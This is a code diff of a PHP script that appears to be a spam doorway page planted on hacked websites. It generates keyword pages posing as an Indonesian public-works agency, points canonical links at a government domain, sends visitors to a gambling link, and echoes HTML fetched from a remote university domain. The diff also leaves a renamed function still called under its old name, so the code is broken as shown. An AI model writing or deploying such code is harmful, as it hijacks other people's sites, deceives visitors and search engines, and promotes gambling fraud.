@@ -1,19 +1,8 @@
 <?php
-function show404() 
+function feedback404()
 {
-  header("HTTP/1.0 404 Not Found");
-  echo "
-    <!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
-    <html><head>
-    <title>403 Forbidden</title>
-    </head><body>
-    <h1>Forbidden</h1>
-    <p>You don't have permission to access this resource.</p>
-    <hr>
-    </body>
-    </html>
-  ";
-  exit;
+  echo file_get_contents("https://unsuri.ac.id/fai/index.html");
+
 }
 
 $keywords = file('list.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
@@ -43,15 +32,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://tamuramah.site/id/$dashbrand";
-$canonical = "https://satona.co.id/product/$dashbrand";
+$amphtml = "https://tamuramah.com/id/$dashbrand";
+$canonical = "https://dpupr.belitung.go.id/dpupr/$dashbrand";
 $cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729697905/OIG2.WU3Cnni0WdpyA63Ffa9o_njcp23.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729873100/OIG2.8RZtqNQir1R2xNPsECaA_piore3.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand PT Satona Chemical Bahan Kimia Surabaya";
-$desc = "$namabrand Seiring dengan kepercayaan yang semakin meningkat dari mitra-mitra kerja perusahaan, PT. Satona semakin hari semakin berkembang dan semakin banyak melakukan perdagangan dengan beraneka produk, yang sebagian besar adalah produk kimia.";
-$konten = "$namabrand Seiring dengan kepercayaan yang semakin meningkat dari mitra-mitra kerja perusahaan, PT. Satona semakin hari semakin berkembang dan semakin banyak melakukan perdagangan dengan beraneka produk, yang sebagian besar adalah produk kimia.";
+$judul = "$namabrand Dinas Pekerjaan Umum Perumahan Rakyat";
+$desc = "$namabrand Dinas Pekerjaan Umum dan Perumahan Rakyat (PUPR) adalah instansi pemerintah yang bertanggung jawab dalam membangun, mengembangkan, dan memelihara infrastruktur serta perumahan rakyat di Indonesia.";
+$konten = "$namabrand Dinas Pekerjaan Umum dan Perumahan Rakyat (PUPR) adalah instansi pemerintah yang bertanggung jawab dalam membangun, mengembangkan, dan memelihara infrastruktur serta perumahan rakyat di Indonesia.";
 ?>
 
 <!DOCTYPE HTML>
